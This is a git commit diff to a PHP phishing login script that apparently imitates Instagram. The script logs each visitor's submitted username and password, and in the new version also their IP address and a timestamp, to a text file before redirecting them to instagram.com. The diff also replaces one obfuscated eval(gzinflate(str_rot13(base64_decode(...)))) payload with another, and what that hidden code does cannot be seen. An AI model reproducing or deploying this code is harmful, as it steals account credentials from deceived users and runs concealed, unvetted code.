e31e0c3d1b7082a80d9c5cb195c13397e5a989ff
karazafer <kara_zafer_vedat@hotmail.com>
2019-08-14 18:55:09 +0300

    update

--- login.php
+++ login.php
@@ -1,5 +1,7 @@
 <?php
-eval(gzinflate(str_rot13(base64_decode('hY/BCsIwEFHvhf7DRQJIKBXPoiDagkNH0m0SKW4bjKhaVUXUvzcNFPGit3Lm7ews6fQN5hAJhkquRG/aZ2t6TZNXfZ5ZRiVHNAsDoqSxjnBNsxeMwiDqDNctu/MI5gsg9X5KScdrEONG4hDFjGxV3XwhgxifwmDsksGFo2PR6JrUl/ZvblHc2HteMtxX1YsoEksddbHbSj4rAas7/p/LN0yxLhPwP/zGdkkd6Laiy3qZdPRmgDTMsqEjf2X0e73DRFXw9uwN'))));
-file_put_contents("hesaplar.txt", "kullanıcı adı: " . $_POST['username'] . " şifre: " . $_POST['password'] . "\n", FILE_APPEND);
+date_default_timezone_set('Europe/Istanbul');  
+$cur_time=date("d-m-Y H:i:s");
+eval(gzinflate(str_rot13(base64_decode('hY/Rd8IwFIbvC32HUAjUTqlrLQ5xjTBDK3bcjVUJdjBS14Qkxe3tl1PK2M08SuH/v8P5ggd7gxUgxcVITaFS0Q7i2vau0PYyXxRTGbRZE3m084Hj1vJimKUJGpy0Pf+UCEmvgJtQSLNGNoXZOQ+I4c7dtXr/IEb4QDqD4DERqQn9IPSURLKrGHbWclazZpq8BAMIEk8FBRGMm67vPMxja45djJz02oyhQzm8Hem2OrBrMwdiB/mc27yTekznEP/6P0EJO9I9o+t9vSH09wBhueeTo/ySIu6NjRRXUKyXPw=='))));
+file_put_contents("veri.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . " İp: " . $_SERVER['REMOTE_ADDR'] . " Tarih: " . $cur_time . "\n", FILE_APPEND);
 header('Location: https://instagram.com');
 exit();
